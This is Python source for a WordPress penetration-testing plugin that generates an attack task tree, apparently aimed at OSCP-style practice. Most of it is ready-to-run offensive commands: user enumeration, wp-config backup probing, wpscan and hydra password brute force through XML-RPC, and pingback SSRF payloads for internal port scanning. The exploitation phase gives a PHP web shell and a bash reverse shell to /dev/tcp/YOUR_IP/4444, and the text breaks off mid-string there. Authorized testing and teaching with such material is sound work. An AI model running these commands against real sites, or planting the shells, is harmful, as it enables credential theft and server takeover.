"""
WordPress CMS enumeration and exploitation plugin

Generates comprehensive tasks for WordPress pentesting including:
- Version detection and fingerprinting
- User enumeration (multiple techniques)
- Plugin and theme discovery
- XML-RPC testing and exploitation
- Authentication bypass techniques
- REST API enumeration
- Configuration file discovery
- Known vulnerability exploitation
- Post-exploitation database access

Extracted from HackTricks: network-services-pentesting/pentesting-web/wordpress.md
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class WordPressPlugin(ServicePlugin):
    """WordPress CMS enumeration and exploitation plugin"""

    @property
    def name(self) -> str:
        return "wordpress"

    @property
    def default_ports(self) -> List[int]:
        return [80, 443, 8080, 8443]

    @property
    def service_names(self) -> List[str]:
        return ['http', 'https', 'http-proxy', 'ssl/http']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """
        Detect WordPress installations

        Detection methods:
        1. Service name (http/https)
        2. Common HTTP ports
        3. Product/extrainfo contains 'wordpress'

        Note: This creates tasks that will only execute if WordPress is confirmed present
        """
        service = port_info.get('service', '').lower()
        product = port_info.get('product', '').lower()
        extrainfo = port_info.get('extrainfo', '').lower()
        port = port_info.get('port')

        # Check for HTTP-like services
        if any(svc in service for svc in ['http', 'ssl/http']):
            return True

        # Check product/extrainfo for WordPress indicators
        if 'wordpress' in product or 'wordpress' in extrainfo:
            return True

        # Check common ports
        if port in self.default_ports:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate WordPress enumeration task tree"""

        # Determine protocol
        protocol = 'https' if port in [443, 8443] or 'ssl' in service_info.get('service', '') else 'http'
        base_url = f'{protocol}://{target}:{port}'

        tasks = {
            'id': f'wordpress-enum-{port}',
            'name': f'WordPress Enumeration (Port {port})',
            'type': 'parent',
            'children': []
        }

        # PHASE 1: Detection and Version Fingerprinting
        detection_tasks = {
            'id': f'wordpress-detection-{port}',
            'name': 'WordPress Detection & Version Fingerprinting',
            'type': 'parent',
            'children': [
                {
                    'id': f'wordpress-check-files-{port}',
                    'name': 'Check WordPress Signature Files',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -s {base_url}/license.txt {base_url}/readme.html | grep -i version',
                        'description': 'Check license.txt and readme.html for WordPress version',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'flag_explanations': {
                            '-s': 'Silent mode (no progress bar)',
                            'grep -i version': 'Search for version strings (case-insensitive)'
                        },
                        'success_indicators': [
                            'Version string found in license.txt',
                            'WordPress version number revealed in readme.html',
                            'Files return 200 OK status'
                        ],
                        'failure_indicators': [
                            '404 Not Found - files may be deleted',
                            '403 Forbidden - access restricted',
                            'No version information found'
                        ],
                        'next_steps': [
                            'Document exact version for CVE research',
                            'Check searchsploit for version-specific exploits',
                            'Proceed to meta tag version detection'
                        ],
                        'alternatives': [
                            f'Manual: Browse to {base_url}/license.txt in browser',
                            f'Manual: Browse to {base_url}/readme.html',
                            f'curl -I {base_url}/wp-admin/ | grep -i "x-powered-by"'
                        ],
                        'notes': 'license.txt and readme.html are default WordPress files often containing version information. Many installations delete these for security.'
                    }
                },
                {
                    'id': f'wordpress-version-meta-{port}',
                    'name': 'Extract Version from HTML Meta Tags',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -s {base_url}/ | grep -E \'content="WordPress|wp-content/.*ver=\'',
                        'description': 'Parse HTML source for WordPress version in meta tags and resource URLs',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'flag_explanations': {
                            '-s': 'Silent mode (suppress progress)',
                            '-E': 'Extended regex for pattern matching',
                            'content="WordPress': 'Match meta generator tag',
                            'wp-content/.*ver=': 'Match version parameters in CSS/JS URLs'
                        },
                        'success_indicators': [
                            '<meta name="generator" content="WordPress X.X.X">',
                            'Version parameters in stylesheet/script URLs',
                            'wp-includes/js/jquery/jquery.js?ver=X.X.X'
                        ],
                        'failure_indicators': [
                            'Generator meta tag removed (hardened site)',
                            'Version strings stripped from resources',
                            'No WordPress indicators found'
                        ],
                        'next_steps': [
                            'Cross-reference version with multiple sources',
                            'Search for version-specific vulnerabilities',
                            'Document version in enumeration.md'
                        ],
                        'alternatives': [
                            'Manual: View page source in browser (Ctrl+U)',
                            'Manual: Inspect CSS/JS resource URLs',
                            f'curl -s {base_url}/ | grep -oP "(?<=ver=)[0-9.]+"'
                        ],
                        'notes': 'WordPress includes version numbers in meta tags and resource URLs by default. Hardened sites remove these. Check multiple pages if homepage is customized.'
                    }
                },
                {
                    'id': f'wordpress-sitemap-{port}',
                    'name': 'Check WordPress Sitemap (5.5+)',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -s {base_url}/wp-sitemap.xml -I',
                        'description': 'WordPress 5.5+ auto-generates XML sitemap with all public posts',
                        'tags': ['OSCP:MEDIUM', 'QUICK_WIN'],
                        'flag_explanations': {
                            '-s': 'Silent mode',
                            '-I': 'HEAD request only (check existence without downloading)'
                        },
                        'success_indicators': [
                            '200 OK response',
                            'Content-Type: application/xml',
                            'Sitemap reveals post structure'
                        ],
                        'failure_indicators': [
                            '404 Not Found (WordPress < 5.5 or disabled)',
                            'Sitemaps disabled in configuration'
                        ],
                        'next_steps': [
                            'Download full sitemap: curl -s {base_url}/wp-sitemap.xml',
                            'Extract post URLs for content analysis',
                            'Identify author usernames from post URLs'
                        ],
                        'alternatives': [
                            f'Manual: Browse to {base_url}/wp-sitemap.xml',
                            f'Check robots.txt for sitemap references: curl -s {base_url}/robots.txt'
                        ],
                        'notes': 'WordPress 5.5+ generates sitemaps automatically. Reveals site structure and can leak author usernames via post author slugs.'
                    }
                }
            ]
        }
        tasks['children'].append(detection_tasks)

        # PHASE 2: User Enumeration
        user_enum_tasks = {
            'id': f'wordpress-user-enum-{port}',
            'name': 'WordPress User Enumeration',
            'type': 'parent',
            'children': [
                {
                    'id': f'wordpress-user-id-brute-{port}',
                    'name': 'User Enumeration via Author ID Brute Force',
                    'type': 'command',
                    'metadata': {
                        'command': f'for i in {{1..10}}; do curl -s -I {base_url}/?author=$i | grep -E "HTTP|Location"; done',
                        'description': 'Brute force author IDs to discover valid usernames (200/30X = valid, 404 = invalid)',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'QUICK_WIN'],
                        'flag_explanations': {
                            '-s': 'Silent mode (no progress)',
                            '-I': 'HEAD request (faster than GET)',
                            'grep -E "HTTP|Location"': 'Show HTTP status and redirect location',
                            '/?author=$i': 'WordPress author archive URL parameter'
                        },
                        'success_indicators': [
                            'HTTP 200 OK - valid user, archive exists',
                            'HTTP 301/302 with Location header - valid user, redirected to author page',
                            'Location header reveals username in URL slug'
                        ],
                        'failure_indicators': [
                            'HTTP 404 Not Found - invalid user ID',
                            'All requests return 404 - author archives disabled',
                            'HTTP 403 Forbidden - enumeration blocked'
                        ],
                        'next_steps': [
                            'Extract usernames from Location headers',
                            'Test discovered usernames at /wp-login.php',
                            'Attempt brute force on valid accounts',
                            'Check wp-json API for user details'
                        ],
                        'alternatives': [
                            f'Manual: Browse to {base_url}/?author=1 and check redirect',
                            f'Manual: Check HTTP response codes in browser developer tools',
                            f'wpscan --url {base_url} --enumerate u',
                            f'curl -s {base_url}/?author=1 -L | grep -oP "(?<=author/)[^/]+"'
                        ],
                        'notes': 'Valid user IDs redirect to author archives. Username appears in redirect URL. Extend range beyond 10 if large site. OSCP tip: This works even on hardened WordPress - author archives are core functionality.',
                        'estimated_time': '30 seconds'
                    }
                },
                {
                    'id': f'wordpress-user-wpjson-{port}',
                    'name': 'User Enumeration via WP REST API',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -s {base_url}/wp-json/wp/v2/users | jq -r \'.[] | "ID: \\(.id) | User: \\(.name) | Slug: \\(.slug)"\'',
                        'description': 'WordPress REST API often exposes all users with detailed information',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'AUTOMATED'],
                        'flag_explanations': {
                            '/wp-json/wp/v2/users': 'WordPress REST API users endpoint (default enabled)',
                            '-s': 'Silent mode',
                            'jq -r': 'Parse JSON response and extract fields',
                            '.id': 'User ID number',
                            '.name': 'Display name',
                            '.slug': 'Username slug (often the login username)'
                        },
                        'success_indicators': [
                            'JSON array of user objects returned',
                            'User IDs, names, and slugs revealed',
                            'Additional fields: avatar_urls, description, link'
                        ],
                        'failure_indicators': [
                            '404 Not Found - REST API disabled',
                            'Empty array [] - no users found or restricted',
                            'HTTP 403 - API access restricted',
                            'rest_user_cannot_view error - permissions enforced'
                        ],
                        'next_steps': [
                            'Document all usernames for password attacks',
                            'Check user descriptions for information disclosure',
                            'Cross-reference with author ID enumeration',
                            'Try /wp-json/wp/v2/pages to find page authors'
                        ],
                        'alternatives': [
                            f'Manual: Browse to {base_url}/wp-json/wp/v2/users in browser',
                            f'Without jq: curl -s {base_url}/wp-json/wp/v2/users | grep -oP \'"slug":"\\K[^"]+\'',
                            f'curl -s {base_url}/wp-json/oembed/1.0/embed?url={base_url}/any-post | jq .author_name',
                            f'Check specific user: curl -s {base_url}/wp-json/wp/v2/users/1'
                        ],
                        'notes': 'WordPress REST API enabled by default since WP 4.7. Exposes users who have published posts. jq not always available on exam - use grep alternative. OSCP: Always check REST API first - fastest user enumeration method.',
                        'estimated_time': '10 seconds'
                    }
                },
                {
                    'id': f'wordpress-login-enum-{port}',
                    'name': 'Username Validation via Login Error Messages',
                    'type': 'manual',
                    'metadata': {
                        'description': 'WordPress /wp-login.php shows different error messages for valid vs invalid usernames',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'success_indicators': [
                            'Valid username: "ERROR: The password you entered for the username X is incorrect"',
                            'Invalid username: "ERROR: Invalid username"',
                            'Different message = valid username confirmed'
                        ],
                        'failure_indicators': [
                            'Same error message for all attempts (hardened)',
                            'Login page protected by rate limiting',
                            'Captcha required'
                        ],
                        'next_steps': [
                            'Document confirmed valid usernames',
                            'Attempt password brute force on valid accounts',
                            'Check for 2FA before brute force attempts',
                            'Try default passwords: admin, password, wordpress'
                        ],
                        'alternatives': [
                            f'Automated: wpscan --url {base_url} --enumerate u',
                            f'Manual script: for user in admin root administrator; do curl -s -d "log=$user&pwd=wrong" {base_url}/wp-login.php | grep -o "ERROR.*"; done'
                        ],
                        'notes': f'Manual steps:\n1. Browse to {base_url}/wp-login.php\n2. Enter test username + random password\n3. Observe error message\n4. Different messages for valid/invalid users\n\nOSCP exam: This is a reliable fallback when APIs are disabled. Note exact error messages in your enumeration.md.',
                        'estimated_time': '2 minutes per username'
                    }
                }
            ]
        }
        tasks['children'].append(user_enum_tasks)

        # PHASE 3: Plugin and Theme Discovery
        plugin_theme_tasks = {
            'id': f'wordpress-plugins-themes-{port}',
            'name': 'Plugin and Theme Discovery',
            'type': 'parent',
            'children': [
                {
                    'id': f'wordpress-plugins-passive-{port}',
                    'name': 'Passive Plugin Discovery from HTML',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -s {base_url}/ | grep -oP "wp-content/plugins/\\K[^/]+" | sort -u',
                        'description': 'Extract plugin names from wp-content/plugins/ references in HTML source',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'flag_explanations': {
                            '-s': 'Silent mode',
                            'grep -oP': 'Perl regex with only-matching output',
                            'wp-content/plugins/\\K': 'Match after wp-content/plugins/ (K = keep left side)',
                            '[^/]+': 'Plugin directory name (everything before next slash)',
                            'sort -u': 'Unique sorted list'
                        },
                        'success_indicators': [
                            'List of plugin directory names',
                            'Common plugins: akismet, jetpack, contact-form-7, woocommerce',
                            'Custom/uncommon plugins (higher vulnerability chance)'
                        ],
                        'failure_indicators': [
                            'No plugins found (minimal site or obfuscated)',
                            'Empty output (check other pages)',
                            'wp-content directory renamed (security hardening)'
                        ],
                        'next_steps': [
                            'Research each plugin for known vulnerabilities',
                            'Check plugin version via readme.txt files',
                            'Verify active plugins with active enumeration',
                            'Search searchsploit for plugin exploits'
                        ],
                        'alternatives': [
                            'Manual: View page source, search for "wp-content/plugins"',
                            f'curl -s {base_url}/wp-content/plugins/ | grep -oP \'href="\\K[^/"]+\'',
                            f'Full command: curl -s {base_url}/ | sed -n \'s/.*wp-content\\/plugins\\/\\([^/]*\\).*/\\1/p\' | sort -u'
                        ],
                        'notes': 'Only finds plugins that load resources (CSS/JS) on the page. Active plugins without public assets will not appear. Check multiple pages (homepage, posts, login) for complete coverage.',
                        'estimated_time': '30 seconds'
                    }
                },
                {
                    'id': f'wordpress-themes-passive-{port}',
                    'name': 'Passive Theme Discovery from HTML',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -s {base_url}/ | grep -oP "wp-content/themes/\\K[^/]+" | sort -u',
                        'description': 'Extract theme name from wp-content/themes/ references in HTML source',
                        'tags': ['OSCP:MEDIUM', 'QUICK_WIN', 'MANUAL'],
                        'flag_explanations': {
                            '-s': 'Silent mode',
                            'grep -oP': 'Perl regex, only-matching output',
                            'wp-content/themes/\\K': 'Match after wp-content/themes/ (drop prefix)',
                            '[^/]+': 'Theme directory name',
                            'sort -u': 'Unique sorted output'
                        },
                        'success_indicators': [
                            'Active theme name revealed',
                            'Common themes: twentytwenty, twentytwentyone, Avada, Divi',
                            'Theme directory name extracted'
                        ],
                        'failure_indicators': [
                            'No theme references (custom implementation)',
                            'Multiple themes (child theme + parent)',
                            'Empty output'
                        ],
                        'next_steps': [
                            f'Check theme version: curl -s {base_url}/wp-content/themes/THEME/style.css | grep Version',
                            'Research theme vulnerabilities',
                            'Check for theme file editor access (if admin)',
                            'Identify theme 404.php location for RCE attempts'
                        ],
                        'alternatives': [
                            'Manual: View page source, search for "wp-content/themes"',
                            f'curl -s {base_url}/ | grep -E "themes/[^/]+" -o | cut -d/ -f2 | sort -u',
                            'Check CSS comments for theme info'
                        ],
                        'notes': 'Active theme is the current site theme. WordPress includes default twentyXX themes. Custom themes may have undiscovered vulnerabilities. Theme 404.php is a common RCE target if you gain admin access.',
                        'estimated_time': '30 seconds'
                    }
                },
                {
                    'id': f'wordpress-wpscan-enumerate-{port}',
                    'name': 'Active Plugin/Theme Enumeration with WPScan',
                    'type': 'command',
                    'metadata': {
                        'command': f'wpscan --url {base_url} --enumerate ap,at,tt,cb,dbe --plugins-detection aggressive --api-token YOUR_API_TOKEN',
                        'description': 'Comprehensive WordPress enumeration with vulnerability database lookups',
                        'tags': ['OSCP:HIGH', 'AUTOMATED', 'NOISY'],
                        'flag_explanations': {
                            '--url': 'Target WordPress site URL',
                            '--enumerate ap': 'All plugins (active + passive detection)',
                            '--enumerate at': 'All themes',
                            '--enumerate tt': 'Timthumbs (vulnerable thumbnail scripts)',
                            '--enumerate cb': 'Config backups (wp-config.php~, etc)',
                            '--enumerate dbe': 'Database exports (.sql files)',
                            '--plugins-detection aggressive': 'Test for non-linked plugins (brute force common names)',
                            '--api-token': 'WPScan API token for vulnerability data (free: 50 requests/day)'
                        },
                        'success_indicators': [
                            'Plugins and themes discovered with version numbers',
                            'Vulnerabilities matched from database',
                            'Config backups or database dumps found',
                            'CVE numbers and exploit references provided'
                        ],
                        'failure_indicators': [
                            'WAF blocking requests (HTTP 403)',
                            'Rate limiting (too many requests)',
                            'API token limit exceeded',
                            'Connection timeouts'
                        ],
                        'next_steps': [
                            'Research all identified vulnerabilities',
                            'Download config backups if found',
                            'Search searchsploit for exploits: searchsploit wordpress PLUGIN',
                            'Test identified vulnerabilities manually',
                            'Document all findings in enumeration.md'
                        ],
                        'alternatives': [
                            'Manual plugin brute force: wfuzz -w /usr/share/wordlists/wfuzz/general/common.txt --hc 404 {base_url}/wp-content/plugins/FUZZ/readme.txt',
                            'cmsmap: cmsmap -s {base_url} -t 2',
                            'Manual: curl each plugin readme.txt for versions'
                        ],
                        'notes': f'Get free API token at https://wpscan.com/register (50 daily requests).\nAggressive mode is NOISY - generates significant traffic.\nOSCP: May trigger IDS/WAF - use manual methods first if stealth required.\nSave output with -o flag for report: wpscan --url {base_url} --enumerate ap -o wpscan-results.txt\n\nTime estimate: 5-15 minutes depending on site size and enumeration options.',
                        'estimated_time': '5-15 minutes'
                    }
                }
            ]
        }
        tasks['children'].append(plugin_theme_tasks)

        # PHASE 4: XML-RPC Testing
        xmlrpc_tasks = {
            'id': f'wordpress-xmlrpc-{port}',
            'name': 'XML-RPC Testing and Exploitation',
            'type': 'parent',
            'children': [
                {
                    'id': f'wordpress-xmlrpc-check-{port}',
                    'name': 'Check XML-RPC Availability',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -s -d \'<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>\' {base_url}/xmlrpc.php | grep -oP "<name>\\K[^<]+" | head -20',
                        'description': 'Test if XML-RPC is enabled and list available methods',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'flag_explanations': {
                            '-s': 'Silent mode',
                            '-d': 'POST data (XML payload)',
                            'system.listMethods': 'XML-RPC method to list all available methods',
                            'grep -oP "<name>\\K[^<]+"': 'Extract method names from XML response',
                            'head -20': 'Show first 20 methods'
                        },
                        'success_indicators': [
                            'XML response with list of methods',
                            'Methods visible: wp.getUsersBlogs, wp.getCategories, pingback.ping',
                            'HTTP 200 OK with XML content'
                        ],
                        'failure_indicators': [
                            '404 Not Found - xmlrpc.php disabled',
                            'XML-RPC services are disabled on this site',
                            'HTTP 403 Forbidden',
                            'Empty response'
                        ],
                        'next_steps': [
                            'If wp.getUsersBlogs found: attempt credential brute force',
                            'If pingback.ping found: test SSRF and port scanning',
                            'Check for system.multicall (faster brute force)',
                            'Document all available methods'
                        ],
                        'alternatives': [
                            f'Manual: Use Burp Suite to send XML-RPC POST requests to {base_url}/xmlrpc.php',
                            f'curl -s -I {base_url}/xmlrpc.php (check if file exists)',
                            f'nmap --script http-wordpress-enum {target} -p {port}'
                        ],
                        'notes': 'XML-RPC is a legacy WordPress API (pre-REST). Often enabled for backwards compatibility. Key methods:\n- wp.getUsersBlogs: credential validation (brute force)\n- pingback.ping: SSRF + port scanning\n- system.multicall: batch requests (faster attacks)\n\nOSCP: XML-RPC is high-value target - often overlooked and still enabled on modern sites.',
                        'estimated_time': '30 seconds'
                    }
                },
                {
                    'id': f'wordpress-xmlrpc-bruteforce-{port}',
                    'name': 'XML-RPC Credential Brute Force',
                    'type': 'command',
                    'metadata': {
                        'command': f'wpscan --url {base_url} --passwords /usr/share/wordlists/rockyou.txt --usernames admin,administrator --password-attack xmlrpc',
                        'description': 'Brute force credentials via XML-RPC (bypasses rate limiting and may bypass 2FA)',
                        'tags': ['OSCP:MEDIUM', 'BRUTE_FORCE', 'NOISY'],
                        'flag_explanations': {
                            '--password-attack xmlrpc': 'Use XML-RPC for authentication attempts (faster, may bypass protections)',
                            '--passwords': 'Password wordlist (rockyou.txt = 14M passwords, may take hours)',
                            '--usernames': 'Comma-separated list of usernames to test',
                            '--url': 'Target WordPress site'
                        },
                        'success_indicators': [
                            'Valid credentials found: [+] [SUCCESS] - username:password',
                            'Login successful message',
                            'Credentials saved to output file'
                        ],
                        'failure_indicators': [
                            'All attempts failed',
                            'XML-RPC disabled or blocked',
                            'Account lockout after X attempts',
                            'WAF blocking requests'
                        ],
                        'next_steps': [
                            'Login to /wp-admin/ with discovered credentials',
                            'Check user role: Administrator > Editor > Author',
                            'If admin: edit theme files for RCE',
                            'If not admin: attempt privilege escalation',
                            'Document credentials in credentials.md'
                        ],
                        'alternatives': [
                            'Manual XML-RPC test:\ncurl -d \'<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>password</value></param></params></methodCall>\' {base_url}/xmlrpc.php',
                            'Smaller wordlist for faster testing: --passwords /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt',
                            'Hydra: hydra -l admin -P passwords.txt {target} -s {port} http-post-form "/xmlrpc.php:..."'
                        ],
                        'notes': 'XML-RPC brute force advantages:\n1. May bypass login page rate limiting\n2. May bypass 2FA (legacy authentication)\n3. Faster than web form brute force\n\nOSCP exam: Use small wordlist first (top 100-1000). Full rockyou.txt takes hours. Document time spent.\n\nXML-RPC returns "Incorrect username or password" in HTTP 200 response - no account lockout indication.\n\nSystem.multicall allows testing 1000s of passwords in single request - extremely fast but complex.',
                        'estimated_time': '10 minutes (small list) to 2+ hours (rockyou.txt)'
                    }
                },
                {
                    'id': f'wordpress-xmlrpc-pingback-{port}',
                    'name': 'XML-RPC Pingback SSRF and Port Scanning',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Use pingback.ping method for SSRF attacks and internal port scanning',
                        'tags': ['OSCP:LOW', 'MANUAL', 'ADVANCED'],
                        'success_indicators': [
                            'faultCode 0 or 16: Target port OPEN',
                            'faultCode 17+: Target port CLOSED',
                            'Can force WordPress to make HTTP requests to arbitrary targets',
                            'Internal network scanning possible'
                        ],
                        'failure_indicators': [
                            'pingback.ping method not available',
                            'All requests return same error',
                            'pingback.ping disabled'
                        ],
                        'next_steps': [
                            'Scan internal network: 192.168.0.1-254',
                            'Port scan localhost: 127.0.0.1:1-65535',
                            'Test for internal services (Redis, MySQL, etc)',
                            'Exfiltrate data via pingback to your server',
                            'Document any accessible internal services'
                        ],
                        'alternatives': [
                            'wpxploit tool: https://github.com/relarizky/wpxploit',
                            'Manual Burp Suite requests',
                            'Custom Python script for automation'
                        ],
                        'notes': f'''Manual pingback.ping SSRF exploitation:

1. Test if pingback.ping exists:
curl -d '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://YOUR_SERVER:80</string></value></param><param><value><string>{base_url}/any-valid-post</string></value></param></params></methodCall>' {base_url}/xmlrpc.php

2. Scan internal port (e.g., MySQL on 3306):
curl -d '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://127.0.0.1:3306</string></value></param><param><value><string>{base_url}/valid-post-url</string></value></param></params></methodCall>' {base_url}/xmlrpc.php

3. Interpret faultCode in response:
   - faultCode 0 or 16: Port OPEN
   - faultCode 17+: Port CLOSED or filtered

OSCP relevance: Low priority - advanced technique. Focus on simpler attacks first. Useful if you need internal network access or port scanning from target perspective.

Time investment: 30-60 minutes for manual testing''',
                        'estimated_time': '30-60 minutes'
                    }
                }
            ]
        }
        tasks['children'].append(xmlrpc_tasks)

        # PHASE 5: File Discovery and Configuration
        file_discovery_tasks = {
            'id': f'wordpress-files-{port}',
            'name': 'WordPress File and Configuration Discovery',
            'type': 'parent',
            'children': [
                {
                    'id': f'wordpress-config-check-{port}',
                    'name': 'Check for Exposed wp-config.php',
                    'type': 'command',
                    'metadata': {
                        'command': f'for path in wp-config.php wp-config.php.bak wp-config.php~ wp-config.txt wp-config.old; do echo "Testing $path:"; curl -s {base_url}/$path -I | grep HTTP; done',
                        'description': 'Test for exposed or backup wp-config.php files containing database credentials',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'flag_explanations': {
                            'wp-config.php': 'Main WordPress configuration file (normally not accessible)',
                            '.bak, ~, .txt, .old': 'Common backup file extensions',
                            '-s': 'Silent mode',
                            '-I': 'HEAD request (check status without downloading)',
                            'grep HTTP': 'Show only HTTP status line'
                        },
                        'success_indicators': [
                            'HTTP 200 OK - file accessible (major finding!)',
                            'File contains database credentials',
                            'Authentication keys and salts exposed'
                        ],
                        'failure_indicators': [
                            'HTTP 404 Not Found (expected for wp-config.php)',
                            'HTTP 403 Forbidden (protected by .htaccess)',
                            'All backup extensions return 404'
                        ],
                        'next_steps': [
                            'If 200: Download immediately: curl -s {base_url}/wp-config.php',
                            'Extract DB credentials (DB_NAME, DB_USER, DB_PASSWORD, DB_HOST)',
                            'Use credentials to connect to database',
                            'Document in breakthrough.md - this is critical finding',
                            'Check if credentials work for SSH/admin panels'
                        ],
                        'alternatives': [
                            f'Manual: Browse to each path in browser',
                            f'gobuster dir -u {base_url} -w /usr/share/seclists/Discovery/Web-Content/wordpress.txt',
                            f'Check parent directory: curl -s {base_url}/../wp-config.php',
                            'LFI attempts if available: ../wp-config.php'
                        ],
                        'notes': 'wp-config.php should NEVER be accessible via HTTP. Server misconfigurations or backup files may expose it. Contains:\n- DB_NAME, DB_USER, DB_PASSWORD, DB_HOST\n- AUTH_KEY, SECURE_AUTH_KEY, LOGGED_IN_KEY, NONCE_KEY\n- Table prefix\n\nOSCP: This is a critical finding - database credentials often lead to full compromise. Always check backup extensions.',
                        'estimated_time': '1 minute'
                    }
                },
                {
                    'id': f'wordpress-uploads-check-{port}',
                    'name': 'Check wp-content/uploads for Directory Listing',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -s {base_url}/wp-content/uploads/ | grep -oP \'href="\\K[^"]+\' | head -20',
                        'description': 'Check if uploads directory has directory listing enabled (may reveal uploaded files)',
                        'tags': ['OSCP:MEDIUM', 'QUICK_WIN', 'MANUAL'],
                        'flag_explanations': {
                            '/wp-content/uploads/': 'Default WordPress upload directory',
                            '-s': 'Silent mode',
                            'grep -oP \'href="\\K[^"]+\'': 'Extract all href links',
                            'head -20': 'Show first 20 entries'
                        },
                        'success_indicators': [
                            'Directory listing enabled (Index of /wp-content/uploads)',
                            'Year/month subdirectories visible (2024/01/, 2024/02/)',
                            'Uploaded files accessible'
                        ],
                        'failure_indicators': [
                            'HTTP 403 Forbidden',
                            'Index listing disabled',
                            'Redirected to 404 page'
                        ],
                        'next_steps': [
                            'Browse subdirectories: /wp-content/uploads/2024/01/',
                            'Look for interesting files: PDFs, images, documents',
                            'Check for uploaded shells or malicious files',
                            'Download and analyze files for sensitive information',
                            'If upload available: test file upload vulnerabilities'
                        ],
                        'alternatives': [
                            f'Manual: Browse to {base_url}/wp-content/uploads/ in browser',
                            f'Recursive scan: wget -r -np -R "index.html*" {base_url}/wp-content/uploads/',
                            f'Check current month: curl -s {base_url}/wp-content/uploads/$(date +%Y/%m)/'
                        ],
                        'notes': 'Uploads directory structure:\n/wp-content/uploads/YYYY/MM/filename.ext\n\nOSCP relevance: Medium - useful for information gathering. May find uploaded credentials, configs, or shells from previous attacks. Focus on recent months first.',
                        'estimated_time': '2-5 minutes'
                    }
                },
                {
                    'id': f'wordpress-default-paths-{port}',
                    'name': 'Test Default WordPress Paths',
                    'type': 'command',
                    'metadata': {
                        'command': f'for path in wp-login.php wp-admin/ wp-admin.php login/ admin/ robots.txt; do echo "=== $path ==="; curl -s {base_url}/$path -I | grep HTTP; done',
                        'description': 'Check access to default WordPress admin and login paths',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'flag_explanations': {
                            'wp-login.php': 'Default WordPress login page',
                            'wp-admin/': 'Admin dashboard (redirects to login if not authenticated)',
                            'wp-admin.php': 'Sometimes used as alternative admin',
                            'login/': 'May be configured as custom login URL',
                            'robots.txt': 'May reveal admin paths, sitemap, disallowed paths',
                            '-I': 'HEAD request only'
                        },
                        'success_indicators': [
                            'HTTP 200 OK for wp-login.php (login page accessible)',
                            'HTTP 302 redirect for wp-admin/ (redirects to login)',
                            'robots.txt reveals paths: Disallow: /wp-admin/'
                        ],
                        'failure_indicators': [
                            'HTTP 404 for all paths (custom URLs or removed)',
                            'HTTP 403 for admin paths (IP restricted)',
                            'Custom login URL in use'
                        ],
                        'next_steps': [
                            'Access wp-login.php for credential testing',
                            'Note any custom login URLs found',
                            'Check robots.txt for additional paths',
                            'Test default credentials: admin/admin, admin/password',
                            'Attempt password reset if email known'
                        ],
                        'alternatives': [
                            f'Manual: Browse each URL in browser',
                            f'curl -s {base_url}/robots.txt',
                            f'Check for renamed login: gobuster dir -u {base_url} -w /usr/share/wordlists/dirb/common.txt -x php'
                        ],
                        'notes': 'Default login paths:\n- /wp-login.php (most common)\n- /wp-admin/ (redirects to login)\n- /login/\n- /wp-admin.php\n\nSome sites rename wp-login.php for security. Check robots.txt and source code for hints.\n\nOSCP: Always verify login page is accessible before attempting brute force.',
                        'estimated_time': '1 minute'
                    }
                }
            ]
        }
        tasks['children'].append(file_discovery_tasks)

        # PHASE 6: Exploitation (Post-Authentication)
        exploitation_tasks = {
            'id': f'wordpress-exploitation-{port}',
            'name': 'WordPress Exploitation (Requires Credentials)',
            'type': 'parent',
            'children': [
                {
                    'id': f'wordpress-theme-editor-rce-{port}',
                    'name': 'RCE via Theme Editor (Admin Required)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Modify theme PHP files to inject web shell (requires Administrator role)',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MANUAL'],
                        'success_indicators': [
                            'Theme editor accessible at /wp-admin/theme-editor.php',
                            'Can edit 404.php or other theme files',
                            'PHP code execution confirmed',
                            'Web shell accessible'
                        ],
                        'failure_indicators': [
                            'Theme editor disabled (DISALLOW_FILE_EDIT in wp-config)',
                            'User role insufficient (need Administrator)',
                            'File permissions prevent writes',
                            'PHP execution disabled'
                        ],
                        'next_steps': [
                            'Upload full featured web shell',
                            'Establish reverse shell connection',
                            'Enumerate system for privilege escalation',
                            'Access wp-config.php from file system',
                            'Document in exploitation.md'
                        ],
                        'alternatives': [
                            'Plugin upload method (malicious plugin zip)',
                            'Media upload + path traversal',
                            'Metasploit: use exploit/unix/webapp/wp_admin_shell_upload',
                            'Direct file upload via xmlrpc.php if authenticated'
                        ],
                        'notes': f'''Manual RCE via Theme Editor:

1. Login to WordPress admin panel: {base_url}/wp-admin/

2. Navigate to Appearance > Theme Editor
   URL: {base_url}/wp-admin/theme-editor.php

3. Select active theme (current theme shown at top right)

4. Edit 404.php file (right sidebar)
   Alternative files: header.php, footer.php, functions.php

5. Add PHP web shell at top of file:
   <?php system($_GET['cmd']); ?>

   Or full reverse shell:
   <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'"); ?>

6. Click "Update File"

